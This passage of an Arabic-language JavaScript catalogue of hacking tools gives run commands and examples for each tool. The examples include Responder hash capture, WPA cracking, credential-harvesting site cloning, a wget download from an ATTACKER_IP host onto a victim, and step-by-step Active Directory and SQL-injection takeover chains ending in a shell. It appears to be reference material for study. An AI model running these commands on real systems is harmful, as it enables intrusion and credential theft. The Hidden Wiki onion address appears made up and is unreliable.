        requirements: ['شبكة محلية', 'صلاحيات إدارية (root)'],
        installation: 'sudo apt install responder',
        run_command: 'sudo responder -I eth0 -v',
        mitre_attack_mappings: ['T1557.001'],
        icon: 'network',
        post_exploitation_guidance: [
          'استخدم التجزئات التي تم التقاطها مع أدوات مثل Hashcat أو John the Ripper لكسر كلمات المرور.',
          'استخدم هجوم "Pass-the-Hash" مع التجزئات للوصول إلى أنظمة أخرى دون الحاجة لمعرفة كلمة المرور.',
          'حلل أسماء المستخدمين التي تم التقاطها لفهم بنية تسمية الحسابات في المنظمة.'
        ],
        examples: [
          {
            title: 'تشغيل أساسي مع وضع verbose',
            command: 'sudo responder -I eth0 -v',
            description: 'يبدأ Responder في الاستماع على الواجهة eth0 ويعرض معلومات مفصلة حول النشاط الذي يتم التقاطه.',
            is_offensive: true
          }
        ]
      }
    ]
  },
  {
    name: 'اختراق الشبكات اللاسلكية (Wireless Hacking)',
    description: 'أدوات متخصصة في تحليل وتكسير أمان شبكات الواي فاي.',
    tools: [
      {
        id: 'aircrack-ng',
        name: 'Aircrack-ng',
        definition: 'مجموعة أدوات متكاملة لاختبار أمان شبكات الواي فاي. تعتبر المعيار الأساسي في هذا المجال.',
        function: 'تتضمن أدوات لمراقبة الشبكات (التقاط الحزم)، شن هجمات (مثل هجمات قطع الاتصال Deauthentication)، اختبار أجهزة الشبكة، وكسر تشفير WEP و WPA/WPA2-PSK.',
        requirements: ['بطاقة شبكة لاسلكية تدعم وضع المراقبة (Monitor Mode) وحقن الحزم (Packet Injection).'],
        installation: 'sudo apt-get install aircrack-ng',
        run_command: 'sudo airodump-ng wlan0mon',
        mitre_attack_mappings: ['T1557.003'],
        icon: 'wifi',
        examples: [
          {
            title: 'كسر تشفير WPA/WPA2 باستخدام هجوم القاموس',
            command: 'aircrack-ng -w /path/to/wordlist.txt -b 00:11:22:33:44:55 capture-01.cap',
            description: 'يحاول كسر كلمة مرور شبكة WPA/WPA2 عن طريق مقارنة المصافحة الرباعية (4-way handshake) الملتقطة في ملف .cap مع قائمة كلمات.',
            is_offensive: true
          }
        ]
      },
      {
        id: 'wifite',
        name: 'Wifite',
        definition: 'سكربت مؤتمت بالكامل لاختراق الشبكات اللاسلكية المشفرة بـ WEP, WPA, و WPA2.',
        function: 'يقوم بتشغيل سلسلة من الأدوات (مثل مجموعة Aircrack-ng) لأتمتة عملية اكتشاف الشبكات، التقاط المصافحات، وكسر كلمات المرور.',
        requirements: ['مجموعة Aircrack-ng', 'بطاقة شبكة لاسلكية تدعم وضع المراقبة.'],
        installation: 'sudo apt-get install wifite',
        run_command: 'sudo wifite',
        mitre_attack_mappings: ['T1557.003'],
        icon: 'wifi',
        examples: [
          {
            title: 'تشغيل الهجوم المؤتمت',
            command: 'sudo wifite --kill',
            description: 'يبدأ Wifite، ويقوم بقتل أي عمليات قد تتعارض معه، ثم يعرض قائمة بالشبكات المتاحة لبدء الهجوم عليها.',
            is_offensive: true
          }
        ]
      }
    ]
  },
  {
    name: 'الهندسة الاجتماعية (Social Engineering)',
    description: 'أدوات لتنفيذ هجمات تعتمد على خداع العنصر البشري.',
    tools: [
      {
        id: 'set',
        name: 'SET (Social-Engineer Toolkit)',
        definition: 'إطار عمل مفتوح المصدر مصمم خصيصًا لهجمات الهندسة الاجتماعية.',
        function: 'يوفر مجموعة واسعة من نواقل الهجوم، مثل إنشاء صفحات ويب مزيفة لسرقة بيانات الاعتماد، وإرسال رسائل بريد إلكتروني تصيدية، وإنشاء حمولات خبيثة.',
        requirements: ['Kali Linux'],
        installation: 'sudo apt-get install set',
        run_command: 'sudo setoolkit',
        mitre_attack_mappings: ['T1566.002', 'T1204.002'],
        icon: 'social',
        examples: [
          {
            title: 'استنساخ موقع لسرقة بيانات الاعتماد',
            command: '1) Social-Engineering Attacks > 2) Website Attack Vectors > 3) Credential Harvester Attack > 2) Site Cloner',
            description: 'خطوات داخل SET لإنشاء نسخة طبق الأصل من موقع ويب (مثل Facebook) واستضافة صفحة مزيفة لجمع أسماء المستخدمين وكلمات المرور.',
            is_offensive: true
          }
        ]
      }
    ]
  },
  {
    name: 'اختراق أندرويد (Android Hacking)',
    description: 'أدوات لتحليل وهندسة تطبيقات أندرويد العكسية.',
    tools: [
      {
        id: 'apktool',
        name: 'APKTool',
        definition: 'أداة للهندسة العكسية لملفات تطبيقات أندرويد (APK).',
        function: 'تستخدم لتفكيك ملفات APK إلى مواردها الأصلية (مثل ملفات XML و smali) وإعادة تجميعها بعد التعديل. مفيدة لتحليل الشيفرة، تعديل التطبيقات، وحقن الشيفرات الخبيثة.',
        requirements: ['Java Runtime Environment (JRE)'],
        installation: 'sudo apt-get install apktool',
        run_command: 'apktool d app.apk',
        mitre_attack_mappings: ['T1625'],
        icon: 'android',
        examples: [
          {
            title: 'تفكيك تطبيق',
            command: 'apktool d example.apk -o ./output_folder',
            description: 'يقوم بتفكيك ملف example.apk واستخراج محتوياته إلى مجلد "output_folder".',
            is_offensive: false
          }
        ]
      },
      {
        id: 'jadx',
        name: 'JADX',
        definition: 'أداة Decompiler و Dex-to-Java decompiler لواجهة سطر الأوامر وواجهة رسومية.',
        function: 'تستخدم لتحويل ملفات DEX, APK, و JAR إلى شيفرة Java المصدرية، مما يسهل فهم منطق التطبيق وتحليله.',
        requirements: ['Java Development Kit (JDK) 8+'],
        installation: 'sudo apt-get install jadx',
        run_command: 'jadx-gui app.apk',
        mitre_attack_mappings: ['T1625'],
        icon: 'android',
        examples: [
          {
            title: 'فتح تطبيق في الواجهة الرسومية',
            command: 'jadx-gui example.apk',
            description: 'يقوم بفتح ملف APK في واجهة JADX الرسومية، مما يسمح بتصفح وتحليل شيفرة Java المصدرية الناتجة.',
            is_offensive: false
          }
        ]
      },
      {
        id: 'frida',
        name: 'Frida',
        definition: 'مجموعة أدوات حقن شيفرة ديناميكية. تتيح لك حقن سكربتات JavaScript أو شيفرتك الخاصة في تطبيقات تعمل على Windows, macOS, Linux, iOS, و Android.',
        function: 'تستخدم لتحليل التطبيقات في الوقت الفعلي، اعتراض وتعديل استدعاءات الدوال، التلاعب بمنطق التطبيق، وتجاوز آليات الحماية مثل اكتشاف الروت وفحص الشهادات (SSL Pinning).',
        requirements: ['Python 3.x', 'جهاز أندرويد به صلاحيات الروت أو جيلبريك.'],
        installation: 'pip install frida-tools',
        run_command: 'frida-ps -Ua',
        mitre_attack_mappings: ['T1573'],
        icon: 'android',
        examples: [
          {
            title: 'تجاوز فحص الشهادات (SSL Pinning)',
            command: 'frida -U -f com.example.app -l ssl_pinning_bypass.js --no-paus',
            description: 'يقوم بتشغيل التطبيق المحدد وحقن سكربت JavaScript لتجاوز آلية فحص الشهادات، مما يسمح باعتراض حركة مرور HTTPS.',
            is_offensive: true
          }
        ]
      }
    ]
  },
  {
    name: 'التحليل الجنائي والهندسة العكسية (Forensics & RE)',
    description: 'أدوات لتحليل البرمجيات الخبيثة، استعادة البيانات، وتحليل الذاكرة.',
    tools: [
      {
        id: 'ghidra',
        name: 'Ghidra',
        definition: 'إطار عمل للهندسة العكسية للبرمجيات (SRE) تم تطويره بواسطة وكالة الأمن القومي الأمريكية (NSA).',
        function: 'يوفر مجموعة متكاملة من أدوات التحليل، بما في ذلك decompiler و disassembler، لدعم تحليل الشيفرات المترجمة على مجموعة متنوعة من المنصات، بما في ذلك Windows, macOS, و Linux.',
        requirements: ['Java Development Kit (JDK) 11+'],
        installation: 'يتم تنزيله من الموقع الرسمي.',
        run_command: './ghidraRun',
        mitre_attack_mappings: ['T1625'],
        icon: 're',
        examples: [
          {
            title: 'بدء مشروع جديد',
            command: 'ghidraRun',
            description: 'يقوم بتشغيل الواجهة الرسومية لـ Ghidra، حيث يمكنك إنشاء مشروع جديد واستيراد الملف التنفيذي المراد تحليله.',
            is_offensive: false
          }
        ]
      },
      {
        id: 'volatility',
        name: 'Volatility Framework',
        definition: 'إطار عمل مفتوح المصدر لتحليل الذاكرة المتقلبة (RAM).',
        function: 'يستخدم لاستخراج التحف الرقمية من عينات الذاكرة (memory dumps). يمكنه استخراج معلومات حول العمليات الجارية، اتصالات الشبكة، كلمات المرور، وغيرها، وهو أمر حاسم في التحقيقات الجنائية الرقمية وتحليل البرامج الخبيثة.',
        requirements: ['Python 2.7 أو 3.5+ (حسب الإصدار)'],
        installation: 'pip install volatility3',
        run_command: 'python3 vol.py -f memory.dmp windows.info',
        mitre_attack_mappings: ['T1003.001'],
        icon: 'forensics',
        examples: [
          {
            title: 'سرد العمليات الجارية',
            command: 'python3 vol.py -f memory.dmp windows.pslist.PsList',
            description: 'يقوم بتحليل ملف تفريغ الذاكرة وسرد جميع العمليات التي كانت تعمل في وقت التقاط الصورة.',
            is_offensive: false
          }
        ]
      }
    ]
  },
  {
    name: 'منصات وموارد مفيدة (Platforms & Resources)',
    description: 'موارد ومنصات للتدريب العملي، والوصول الآمن للإنترنت.',
    tools: [
      {
        id: 'hackthebox',
        name: 'Hack The Box',
        definition: 'منصة تدريب على اختبار الاختراق عبر الإنترنت.',
        function: 'توفر بيئة معملية تحتوي على أجهزة افتراضية (VMs) بها ثغرات أمنية. يتنافس المستخدمون لاختراق هذه الأجهزة لاختبار وتحسين مهاراتهم في بيئة آمنة وقانونية.',
        requirements: ['اتصال بالإنترنت', 'اشتراك (بعض الأجهزة مجانية).'],
        installation: 'غير قابل للتطبيق',
        run_command: 'غير قابل للتطبيق',
        icon: 'generic',
        examples: [
          {
            title: 'الاتصال بالشبكة',
            command: 'sudo openvpn your_connection_pack.ovpn',
            description: 'مثال على كيفية الاتصال بشبكة Hack The Box باستخدام OpenVPN بعد تنزيل حزمة الاتصال الخاصة بك.',
            is_offensive: false
          }
        ]
      },
      {
        id: 'tryhackme',
        name: 'TryHackMe',
        definition: 'منصة تعليمية عبر الإنترنت لتعلم الأمن السيبراني.',
        function: 'تقدم "غرفًا" تعليمية تفاعلية تغطي موضوعات مختلفة، من أساسيات الشبكات إلى تقنيات اختبار الاختراق المتقدمة، مع توفير أجهزة افتراضية للتدريب العملي مباشرة من المتصفح.',
        requirements: ['اتصال بالإنترنت'],
        installation: 'غير قابل للتطبيق',
        run_command: 'غير قابل للتطبيق',
        icon: 'generic',
        examples: [
          {
            title: 'الوصول إلى الأجهزة',
            command: 'لا يوجد أمر مباشر، يتم الوصول عبر المتصفح.',
            description: 'توفر المنصة وصولاً مباشرًا إلى الأجهزة الافتراضية المستهدفة من خلال واجهة الويب الخاصة بها.',
            is_offensive: false
          }
        ]
      }
    ]
  },
  {
    name: 'أساسيات سطر أوامر لينكس (Linux CLI Basics)',
    description: 'الأوامر الأساسية في نظام لينكس التي لا غنى عنها لأي مختبر اختراق أو مدير نظام.',
    tools: [
        {
            id: 'ls',
            name: 'ls',
            definition: 'أمر لسرد محتويات الدليل.',
            function: 'يعرض الملفات والمجلدات في المسار الحالي أو المحدد.',
            requirements: ['قشرة لينكس.'],
            installation: 'مدمج في جميع أنظمة لينكس.',
            run_command: 'ls -la',
            icon: 'generic',
            examples: [
                {
                    title: 'عرض الملفات المخفية والأذونات',
                    command: 'ls -la',
                    description: 'يعرض قائمة مفصلة بجميع الملفات، بما في ذلك المخفية، مع عرض الأذونات والمالك وحجم الملف.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'cd',
            name: 'cd',
            definition: 'أمر لتغيير الدليل الحالي.',
            function: 'يستخدم للتنقل بين المجلدات في نظام الملفات.',
            requirements: ['قشرة لينكس.'],
            installation: 'مدمج في جميع أنظمة لينكس.',
            run_command: 'cd /var/www/html',
            icon: 'generic',
            examples: [
                {
                    title: 'الانتقال إلى دليل الويب',
                    command: 'cd /var/www/html',
                    description: 'يغير موقعك الحالي إلى الدليل الجذري لخادم الويب، وهو مكان شائع للبحث عن ملفات الإعدادات.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'grep',
            name: 'grep',
            definition: 'أمر للبحث عن أنماط نصية.',
            function: 'يفحص الملفات أو المخرجات القياسية بحثًا عن سطور تحتوي على تطابق مع نمط محدد.',
            requirements: ['قشرة لينكس.'],
            installation: 'مدمج في جميع أنظمة لينكس.',
            run_command: 'grep "password" file.txt',
            icon: 'generic',
            examples: [
                {
                    title: 'البحث عن كلمات مرور في ملفات الإعدادات',
                    command: 'grep -r "password" /etc/',
                    description: 'يبحث بشكل متكرر (-r) في جميع الملفات داخل مجلد /etc/ عن كلمة "password".',
                    is_offensive: true
                }
            ]
        },
        {
            id: 'find',
            name: 'find',
            definition: 'أمر للبحث عن الملفات والمجلدات.',
            function: 'يبحث في شجرة الدليل عن ملفات تطابق معايير معينة (مثل الاسم، الأذونات، الحجم).',
            requirements: ['قشرة لينكس.'],
            installation: 'مدمج في جميع أنظمة لينكس.',
            run_command: 'find / -name "config.php"',
            icon: 'generic',
            examples: [
                {
                    title: 'البحث عن ملفات SUID',
                    command: 'find / -perm -u=s -type f 2>/dev/null',
                    description: 'يبحث عن جميع الملفات التي تحتوي على بت SUID، والتي يمكن أن تكون ناقلًا لتصعيد الامتيازات.',
                    is_offensive: true
                }
            ]
        },
        {
            id: 'chmod',
            name: 'chmod',
            definition: 'أمر لتغيير أذونات الملفات والمجلدات.',
            function: 'يستخدم لتحديد من يمكنه قراءة، كتابة، وتنفيذ ملف.',
            requirements: ['قشرة لينكس.'],
            installation: 'مدمج في جميع أنظمة لينكس.',
            run_command: 'chmod +x script.sh',
            icon: 'generic',
            examples: [
                {
                    title: 'جعل سكربت قابل للتنفيذ',
                    command: 'chmod +x linpeas.sh',
                    description: 'يضيف إذن التنفيذ إلى سكربت LinPEAS، مما يسمح بتشغيله. هذا أمر شائع بعد تنزيل أداة جديدة.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'ps',
            name: 'ps',
            definition: 'أمر لعرض العمليات الجارية حاليًا.',
            function: 'يوفر لقطة للعمليات الحالية. مفيد لمعرفة ما يعمل على النظام.',
            requirements: ['قشرة لينكس.'],
            installation: 'مدمج في جميع أنظمة لينكس.',
            run_command: 'ps aux',
            icon: 'generic',
            examples: [
                {
                    title: 'عرض جميع العمليات بالتفصيل',
                    command: 'ps aux',
                    description: 'يعرض جميع العمليات الجارية لجميع المستخدمين بتنسيق مفصل، وهو أمر مفيد للبحث عن خدمات تعمل بصلاحيات غير متوقعة.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'wget',
            name: 'wget',
            definition: 'أداة لتنزيل الملفات من الشبكة.',
            function: 'تستخدم لتنزيل الملفات من خوادم الويب عبر بروتوكولات HTTP, HTTPS, و FTP.',
            requirements: ['قشرة لينكس.'],
            installation: 'sudo apt-get install wget',
            run_command: 'wget http://example.com/file.zip',
            icon: 'generic',
            examples: [
                {
                    title: 'تنزيل أداة على جهاز الضحية',
                    command: 'wget http://<ATTACKER_IP>/linpeas.sh',
                    description: 'يستخدم لتنزيل أداة (مثل سكربت تعداد) من خادم ويب يتحكم فيه المهاجم إلى النظام المستهدف.',
                    is_offensive: true
                }
            ]
        },
        {
            id: 'id',
            name: 'id',
            definition: 'أمر لعرض معلومات المستخدم والمجموعة.',
            function: 'يطبع معرفات المستخدم (UID) والمجموعة (GID) الحقيقية والفعالة للمستخدم الحالي.',
            requirements: ['قشرة لينكس.'],
            installation: 'مدمج في جميع أنظمة لينكس.',
            run_command: 'id',
            icon: 'generic',
            examples: [
                {
                    title: 'التحقق من المستخدم الحالي',
                    command: 'id',
                    description: 'أحد أول الأوامر التي يتم تشغيلها بعد الحصول على وصول، لمعرفة المستخدم الذي تعمل بصلاحياته والمجموعات التي تنتمي إليها.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'sudo',
            name: 'sudo',
            definition: 'أمر لتنفيذ أمر آخر بصلاحيات مستخدم آخر، عادةً المستخدم الجذر (root).',
            function: 'يسمح للمستخدمين المسموح لهم بتشغيل برامج بامتيازات أمنية لمستخدم آخر.',
            requirements: ['قشرة لينكس.'],
            installation: 'مدمج في معظم أنظمة لينكس.',
            run_command: 'sudo -l',
            icon: 'generic',
            examples: [
                {
                    title: 'التحقق من الصلاحيات الممنوحة',
                    command: 'sudo -l',
                    description: 'يسرد الأوامر التي يُسمح للمستخدم الحالي بتشغيلها باستخدام sudo. يمكن أن يكشف هذا عن مسار سهل لتصعيد الامتيازات.',
                    is_offensive: true
                }
            ]
        }
    ]
  },
  {
    name: 'الويب المظلم والخصوصية (Dark Web & Privacy)',
    description: 'أدوات وموارد لاستكشاف الويب المظلم بأمان والحفاظ على الخصوصية.',
    tools: [
        {
            id: 'tor',
            name: 'Tor (The Onion Router)',
            definition: 'شبكة مفتوحة تساعدك على الدفاع ضد تحليل حركة المرور، وهو شكل من أشكال المراقبة الشبكية التي تهدد الحرية الشخصية والخصوصية.',
            function: 'تعمل عن طريق توجيه اتصالاتك عبر شبكة واسعة من المرحلات التي يديرها متطوعون حول العالم، مما يخفي موقعك واستخدامك للإنترنت عن أي شخص يقوم بمراقبة الشبكة.',
            requirements: ['متصفح Tor أو نظام تشغيل موجه للخصوصية.'],
            installation: 'تنزيل متصفح Tor من الموقع الرسمي.',
            run_command: './start-tor-browser.desktop',
            icon: 'evasion',
            examples: [
                {
                    title: 'تشغيل متصفح Tor',
                    command: './start-tor-browser.desktop',
                    description: 'يقوم بتشغيل متصفح Tor الذي يتصل تلقائيًا بشبكة Tor لتوفير تصفح مجهول.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'whonix',
            name: 'Whonix',
            definition: 'نظام تشغيل مصمم للأمان المتقدم والخصوصية. يعتمد على شبكة Tor.',
            function: 'يتكون من جهازين افتراضيين: "Workstation" (محطة العمل) و "Gateway" (البوابة). يتم توجيه كل حركة مرور الشبكة من محطة العمل بشكل إجباري عبر البوابة، التي تتصل بشبكة Tor. هذا التصميم يمنع تسرب عنوان IP الحقيقي حتى لو تم اختراق محطة العمل.',
            requirements: ['برنامج محاكاة افتراضية (VirtualBox, KVM).'],
            installation: 'استيراد الأجهزة الافتراضية من الموقع الرسمي.',
            run_command: 'Start the Gateway VM, then the Workstation VM.',
            icon: 'evasion',
            examples: [
                {
                    title: 'الاستخدام النموذجي',
                    command: 'لا يوجد أمر محدد. يتم العمل داخل بيئة سطح المكتب لمحطة العمل.',
                    description: 'أي تطبيق يتم تشغيله داخل Whonix Workstation يتم توجيه اتصالاته تلقائيًا عبر Tor.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'tails',
            name: 'Tails (The Amnesic Incognito Live System)',
            definition: 'نظام تشغيل حي (Live OS) يمكنك تشغيله على أي جهاز كمبيوتر تقريبًا من محرك أقراص USB أو DVD.',
            function: 'يهدف إلى الحفاظ على خصوصيتك وإخفاء هويتك. يوجه كل اتصالات الإنترنت عبر شبكة Tor ولا يترك أي أثر على الجهاز الذي تستخدمه ما لم تطلب ذلك صراحةً.',
            requirements: ['محرك أقراص USB (8 جيجابايت على الأقل).'],
            installation: 'حرق صورة النظام على محرك أقراص USB.',
            run_command: 'الإقلاع من محرك أقراص USB.',
            icon: 'evasion',
            examples: [
                {
                    title: 'الاستخدام',
                    command: 'لا يوجد أمر محدد. يتم العمل داخل بيئة سطح المكتب.',
                    description: 'بمجرد الإقلاع، تكون جميع التطبيقات مهيأة مسبقًا للاتصال عبر Tor.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'darkweb-resources',
            name: 'موارد ومحركات بحث للويب المظلم',
            definition: 'روابط لمصادر مفيدة على شبكة Tor. الوصول إلى هذه المواقع يتطلب استخدام متصفح Tor.',
            function: 'توفر نقاط انطلاق لاستكشاف المحتوى على الويب المظلم. يجب توخي الحذر الشديد عند زيارة أي موقع.',
            requirements: ['متصفح Tor.'],
            installation: 'غير قابل للتطبيق.',
            run_command: 'غير قابل للتطبيق.',
            icon: 'web',
            examples: [
                {
                    title: 'محرك بحث DuckDuckGo (Onion)',
                    command: 'https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/',
                    description: 'نسخة Onion من محرك البحث DuckDuckGo، توفر بحثًا خاصًا داخل شبكة Tor.',
                    is_offensive: false
                },
                {
                    title: 'موسوعة The Hidden Wiki',
                    command: 'http://2jwcnprqbugvyi6ok2h2a7z2u3w2w3l2xq2x7x7x7x7x7x7x7.onion/',
                    description: 'دليل يحتوي على روابط لمواقع وخدمات مختلفة على الويب المظلم. (تحذير: قد يحتوي على روابط لمحتوى غير قانوني وخطير).',
                    is_offensive: false
                }
            ]
        }
    ]
  },
  {
    name: 'سلاسل هجومية متكاملة (Integrated Attack Chains)',
    description: 'سيناريوهات واقعية توضح كيفية ربط عدة أدوات معًا لتنفيذ هجوم كامل.',
    tools: [
        {
            id: 'ad-attack-chain',
            name: 'سيناريو اختراق بيئة Active Directory',
            definition: 'سلسلة هجومية توضح الخطوات المتتالية للسيطرة على بيئة Active Directory، بدءًا من الفحص الأولي وانتهاءً بالوصول إلى مسؤول النطاق.',
            function: 'هذا السيناريو يجمع بين أدوات مختلفة لتنفيذ هجوم واقعي، مما يوضح كيف تكمل الأدوات بعضها البعض في اختبار الاختراق.',
            requirements: ['وصول إلى شبكة تحتوي على بيئة Active Directory مستهدفة.'],
            installation: 'تثبيت الأدوات المذكورة (Nmap, CrackMapExec, Responder, Mimikatz).',
            run_command: 'لا يوجد أمر واحد، بل سلسلة من الأوامر.',
            icon: 'ad',
            examples: [
                {
                    title: 'الخطوة 1: فحص الشبكة وتحديد الأهداف',
                    command: 'nmap -p 88,389,445 -oG ad_hosts.txt 192.168.1.0/24',
                    description: 'فحص الشبكة بحثًا عن المنافذ الشائعة لـ Active Directory (Kerberos, LDAP, SMB) وحفظ المضيفين النشطين.',
                    is_offensive: true
                },
                {
                    title: 'الخطوة 2: تسميم LLMNR والتقاط التجزئات',
                    command: 'sudo responder -I eth0 -v',
                    description: 'تشغيل Responder على الشبكة لالتقاط تجزئات NTLMv2 من الأجهزة التي تحاول الوصول إلى مشاركات غير موجودة.',
                    is_offensive: true
                },
                {
                    title: 'الخطوة 3: كسر التجزئات الملتقطة',
                    command: 'hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt',
                    description: 'استخدام Hashcat لمحاولة كسر تجزئات NTLMv2 الملتقطة باستخدام قائمة كلمات شائعة.',
                    is_offensive: true
                },
                {
                    title: 'الخطوة 4: التحقق من بيانات الاعتماد والبحث عن مسؤولين',
                    command: 'crackmapexec smb 192.168.1.0/24 -u USER -p PASSWORD --local-auth --loggedon-users',
                    description: 'استخدام بيانات الاعتماد التي تم كسرها للتحقق من الأجهزة التي يمكن الوصول إليها والبحث عن جلسات لمسؤولين نشطين.',
                    is_offensive: true
                },
                {
                    title: 'الخطوة 5: التحرك الجانبي والسيطرة',
                    command: 'PsExec.exe \\\\DOMAIN_CONTROLLER -u USER -p PASSWORD cmd.exe',
                    description: 'إذا كانت بيانات الاعتماد تنتمي لمسؤول، استخدم PsExec للوصول إلى وحدة التحكم بالنطاق والحصول على سيطرة كاملة.',
                    is_offensive: true
                }
            ]
        },
        {
            id: 'webapp-attack-chain',
            name: 'سيناريو الاستيلاء على تطبيق ويب',
            definition: 'سلسلة هجومية توضح كيفية اختراق تطبيق ويب من خلال استغلال ثغرة حقن SQL، والحصول على قشرة نظام.',
            function: 'هذا السيناريو يوضح دورة حياة هجوم على تطبيق ويب، من جمع المعلومات إلى ما بعد الاستغلال.',
            requirements: ['تطبيق ويب مستهدف به ثغرة حقن SQL.'],
            installation: 'تثبيت الأدوات المذكورة (Nmap, Gobuster, sqlmap).',
            run_command: 'لا يوجد أمر واحد، بل سلسلة من الأوامر.',
            icon: 'web',
            examples: [
                {
                    title: 'الخطوة 1: فحص المنافذ والخدمات',
                    command: 'nmap -sV -p- -T4 target-webapp.com',
                    description: 'فحص جميع المنافذ على الخادم المستهدف لتحديد الخدمات التي تعمل وإصداراتها.',
                    is_offensive: true
                },
                {
                    title: 'الخطوة 2: البحث عن الأدلة والملفات المخفية',
                    command: 'gobuster dir -u http://target-webapp.com -w /usr/share/wordlists/dirb/common.txt',
                    description: 'استخدام Gobuster لاكتشاف صفحات أو أدلة مخفية قد تحتوي على نقاط ضعف، مثل صفحة تسجيل دخول للإدارة.',
                    is_offensive: true
                },
                {
                    title: 'الخطوة 3: اكتشاف واستغلال حقن SQL',
                    command: 'sqlmap -u "http://target-webapp.com/products.php?id=1" --batch --dbs',
                    description: 'استخدام sqlmap لأتمتة اكتشاف ثغرة حقن SQL في معلمة "id" وسرد قواعد البيانات.',
                    is_offensive: true
                },
                {
                    title: 'الخطوة 4: الحصول على قشرة نظام عبر sqlmap',
                    command: 'sqlmap -u "http://target-webapp.com/products.php?id=1" --os-shell',
                    description: 'محاولة استخدام الثغرة لرفع قشرة ويب (web shell) والحصول على وصول إلى سطر أوامر الخادم.',
                    is_offensive: true
                },
                {
                    title: 'الخطوة 5: ترقية القشرة (Shell Upgrade)',
                    command: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
                    description: 'بعد الحصول على قشرة أساسية، يتم استخدام هذا الأمر لترقيتها إلى قشرة Bash تفاعلية كاملة لتحكم أفضل.',
                    is_offensive: true
                }
            ]
        }
    ]
  },
  {
    name: 'أدوات التشفير (Cryptography Tools)',
    description: 'أدوات لإنشاء وإدارة وتكسير التشفير، وحماية البيانات والاتصالات.',
    tools: [
        {
            id: 'gnupg',
            name: 'GnuPG (GPG)',
            definition: 'تطبيق كامل ومجاني لمعيار OpenPGP يسمح لك بتشفير وتوقيع بياناتك واتصالاتك.',
            function: 'يستخدم لإنشاء أزواج مفاتيح (عام/خاص)، تشفير وفك تشفير الملفات، وإنشاء تواقيع رقمية للتحقق من سلامة البيانات وهوية المرسل.',
            requirements: ['نظام تشغيل يدعم GnuPG (مدمج في معظم توزيعات لينكس).'],
            installation: 'sudo apt-get install gnupg',
            run_command: 'gpg --gen-key',
            icon: 'generic',
            mitre_attack_mappings: [],
            examples: [
                {
                    title: 'تشفير ملف',
                    command: 'gpg -e -r recipient@example.com file.txt',
                    description: 'يقوم بتشفير file.txt باستخدام المفتاح العام للمستلم. سيتم إنشاء ملف file.txt.gpg.',
                    is_offensive: false
                },
                {
                    title: 'فك تشفير ملف',
                    command: 'gpg -d file.txt.gpg > file.txt',
                    description: 'يقوم بفك تشفير الملف باستخدام مفتاحك الخاص (سيطلب كلمة المرور).',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'hashicorp-vault',
            name: 'HashiCorp Vault',
            definition: 'أداة لإدارة الأسرار بشكل آمن. تقوم بتأمين وتخزين والتحكم في الوصول إلى الرموز والمفاتيح وكلمات المرور والبيانات الحساسة الأخرى.',
            function: 'يعمل كخادم مركزي لإدارة الأسرار، ويوفر واجهة برمجة تطبيقات موحدة للوصول إليها، مع تسجيل دقيق للوصول وسياسات تحكم صارمة.',
            requirements: ['نظام تشغيل (Linux, Windows, macOS)'],
            installation: 'يتم تنزيله كملف ثنائي من الموقع الرسمي.',
            run_command: 'vault server -dev',
            icon: 'cloud',
            mitre_attack_mappings: [],
            examples: [
                {
                    title: 'كتابة سر',
                    command: 'vault kv put secret/myapp/database username="db-user" password="super-secret"',
                    description: 'يخزن بيانات اعتماد قاعدة البيانات في مسار سري داخل Vault.',
                    is_offensive: false
                },
                {
                    title: 'قراءة سر',
                    command: 'vault kv get secret/myapp/database',
                    description: 'يسترجع بيانات الاعتماد المخزنة من Vault.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'openssl',
            name: 'OpenSSL',
            definition: 'مجموعة أدوات تشفير قوية ومفتوحة المصدر. تعتبر "السكين السويسري" لعمليات التشفير.',
            function: 'تستخدم لإنشاء وإدارة المفاتيح الخاصة والشهادات العامة، تشفير وفك تشفير الملفات، حساب التجزئات، اختبار اتصالات SSL/TLS، وغيرها الكثير.',
            requirements: ['مدمجة في معظم أنظمة التشغيل الشبيهة بيونكس.'],
            installation: 'sudo apt-get install openssl',
            run_command: 'openssl version',
            icon: 'generic',
            mitre_attack_mappings: [],
            examples: [
                {
                    title: 'إنشاء مفتاح خاص وطلب توقيع شهادة (CSR)',
                    command: 'openssl req -new -newkey rsa:2048 -nodes -keyout private.key -out csr.csr',
                    description: 'ينشئ مفتاحًا خاصًا بطول 2048 بت وملف طلب توقيع شهادة لاستخدامه في الحصول على شهادة SSL.',
                    is_offensive: false
                },
                {
                    title: 'حساب تجزئة SHA256 لملف',
                    command: 'openssl dgst -sha256 file.txt',
                    description: 'يحسب قيمة تجزئة SHA256 لملف معين، وهو أمر مفيد للتحقق من سلامة الملف.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'caesar-cipher',
            name: 'تشفير قيصر (Caesar Cipher)',
            definition: 'أحد أقدم وأبسط أشكال التشفير، حيث يتم إزاحة كل حرف في النص الأصلي بعدد ثابت من المواقع في الأبجدية.',
            function: 'يستخدم لشرح مفهوم تشفير الإزاحة. على الرغم من أنه غير آمن للاستخدام الفعلي، إلا أنه أداة تعليمية ممتازة لفهم أساسيات التشفير.',
            requirements: ['لا يوجد متطلبات خاصة، يعتمد على المنطق الرياضي.'],
            installation: 'غير قابل للتطبيق.',
            run_command: 'غير قابل للتطبيق.',
            icon: 'generic',
            mitre_attack_mappings: [],
            examples: [
                {
                    title: 'مثال على تشفير قيصر (إزاحة 3)',
                    command: 'النص الأصلي: HELLO\nالمفتاح: 3\nالنص المشفر: KHOOR',
                    description: 'يتم إزاحة كل حرف بمقدار 3 مواضع في الأبجدية. H -> K, E -> H, L -> O, L -> O, O -> R.',
                    is_offensive: false
                }
            ]
        },
        {
            id: 'vigenere-cipher',
            name: 'تشفير فيجينير (Vigenère Cipher)',
            definition: 'شكل من أشكال التشفير متعدد الأبجديات (polyalphabetic substitution) يستخدم كلمة مفتاحية لتحديد الإزاحة المتغيرة لكل حرف في النص الأصلي.',
